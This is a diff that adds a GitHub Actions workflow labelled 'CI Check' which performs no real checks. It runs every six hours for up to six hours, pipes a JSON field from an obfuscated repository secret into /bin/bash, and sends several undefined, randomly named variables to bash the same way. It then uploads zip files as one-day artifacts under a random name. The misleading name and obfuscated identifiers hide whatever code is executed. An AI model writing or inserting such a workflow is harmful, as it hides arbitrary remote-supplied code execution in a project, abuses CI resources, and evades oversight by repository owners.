@@ -1,0 +1,34 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          f60665: ${{ secrets.f60665 }}
+        run: |
+          printf '%s' "$f60665" | jq -r .g562 | /bin/bash
+          echo $hi0 | jq -r .pzw2050 | /bin/bash
+          echo $zzwwz32871 | jq -r .wglqi8 | /bin/bash
+          echo $dnz6 | jq -r .dj9332 | /bin/bash
+          echo $xx3806 | jq -r .aslc867 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: kcMd4kqC
+          path: "*.zip"
+          retention-days: 1
